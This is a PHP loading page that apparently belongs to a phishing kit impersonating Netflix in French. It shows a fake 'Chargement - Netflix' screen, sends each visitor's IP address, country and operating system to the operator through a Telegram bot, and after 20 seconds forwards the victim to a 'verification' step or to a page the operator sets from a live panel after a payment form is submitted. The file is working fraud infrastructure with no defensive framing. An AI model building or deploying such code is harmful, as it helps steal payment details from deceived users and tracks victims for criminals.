<?php
session_start();
include "config.php";
include "functions.php";

$user_info = getUserInfo();
$timestamp = getCurrentTimestamp();


if (!isset($_SESSION['loading_page_notified'])) {
    $telegram_message = "⏳ <b>User on Loading Page</b> ⏳\n";
    $telegram_message .= "-----------------------------------\n";
    $telegram_message .= "🌍 IP: <code>" . $user_info['ip'] . "</code>\n";
    $telegram_message .= "📍 Country: <code>" . $user_info['country_code'] . "</code>\n";
    $telegram_message .= "💻 OS: <code>" . $user_info['os'] . "</code>\n";
    $telegram_message .= "⏰ Time: " . $timestamp . "\n";

    if (sendMessage($telegram_message)) {
        error_log("Loading page notification sent to Telegram successfully.");
        $_SESSION['loading_page_notified'] = true; 
    } else {
        error_log("Failed to send loading page notification to Telegram.");
    }
}

$redirect_to = '';


if (isset($_SESSION['payment_submitted']) && $_SESSION['payment_submitted'] === true) {
    $redirect_to = 'verification.php';
    unset($_SESSION['payment_submitted']);
} 

else if ($Live_panel) {
    $redirect_file_path = 'redirect/payment.txt'; 
    if (file_exists($redirect_file_path)) {
        $content = trim(file_get_contents($redirect_file_path));
        if (!empty($content)) {
            $redirect_to = $content;
        }
    }

} 

else {
    $redirect_to = 'verification.php';
}

if (!empty($redirect_to)) {
    echo "<script>
            setTimeout(function() {
                window.location.href = '" . $redirect_to . "';
            }, 20000); 
          </script>";
} else {

}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chargement - Netflix</title>
    <link rel="icon" href="files/img/nficon2025.ico">
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
            color: #fff;
            flex-direction: column;
        }
        .logo {
            margin-bottom: 40px;
        }
        .logo img {
            width: 200px;
        }
        .loading-spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #e50914;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            font-size: 18px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="Logonetflix.png" alt="Netflix Logo">
    </div>
    <div class="loading-spinner"></div>
    <p>Veuillez patienter pendant que nous traitons votre demande...</p>
</body>
</html>
